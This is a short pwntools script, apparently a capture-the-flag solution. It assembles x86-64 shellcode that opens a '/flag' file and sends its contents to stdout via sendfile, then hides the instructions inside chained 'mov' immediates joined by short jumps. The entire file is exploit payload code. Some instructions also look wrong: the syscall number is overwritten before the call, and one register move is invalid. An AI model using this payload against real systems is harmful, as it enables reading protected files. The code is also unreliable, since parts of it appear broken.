from pwn import *

context.arch = "amd64"

sh = """mov eax, 2
    pushw 0x0067
    pushw 0x616c
    pushw 0x662f
    xchg rdi, rsp
    xor esi, esi
    xor edx, edx
    syscall
    mov esi, eax
    mov edi, 1
    mov al, 40
    mov eax, 0x100
    mov r10, eax
    syscall
    """.split("\n")

cnt = 0
reg = ["rdi", "rsi", "rdx", "r15", "r14", "r13", "r12", "r11", "r10", "r9", "r8","rdi"]
tmp = b""
final = ""
for ins in sh:
    print(ins)
    if(len(tmp + asm(ins)) >= 6):
        final += f"\"mov {reg[cnt]}, 0x{asm("jmp $+8")[::-1].hex() + "90"*(6-len(tmp)) + tmp[::-1].hex()};\"\n"
        tmp = asm(ins)
        cnt += 1
    else:
        tmp += asm(ins)

final +=  f"\"mov {reg[cnt]}, 0x{asm("jmp $+8")[::-1].hex() + "90"*(6-len(tmp)) + tmp[::-1].hex()};\"\n"

print(final)
